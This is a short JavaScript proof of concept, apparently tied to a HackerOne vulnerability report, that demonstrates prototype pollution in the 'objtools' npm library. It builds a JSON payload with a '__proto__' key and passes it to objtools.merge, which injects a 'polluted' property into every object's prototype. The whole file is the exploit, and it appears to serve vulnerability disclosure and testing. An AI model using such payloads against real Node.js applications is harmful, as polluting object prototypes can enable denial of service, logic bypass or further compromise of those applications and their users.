//https://hackerone.com/reports/878394

 
  const objtools = require("objtools");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}'); //payload
  obj = {};

   

  objtools.merge({}, payload);
// End of file
